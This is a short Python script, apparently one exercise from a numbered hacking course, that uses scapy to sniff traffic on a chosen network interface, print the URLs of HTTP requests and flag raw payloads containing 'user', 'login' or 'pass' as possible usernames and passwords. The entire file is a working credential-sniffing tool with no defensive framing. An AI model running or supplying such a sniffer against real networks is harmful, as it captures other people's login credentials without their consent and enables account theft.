#!/usr/bin/env python

# Usage example: python 04_packet_sniff.py --t interface_name

import argparse
from scapy.all import sniff, Raw
from scapy.layers import http

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('--t', dest='target', required=True)
    args = parser.parse_args()
    return args

def start_sniffing(interface):
    sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(Raw):
        load = packet[Raw].load.decode()
        keywords = ["user", "login", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP Request: " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\nPossible username/password: " + login_info + "\n")

args = get_arguments()
start_sniffing(args.target)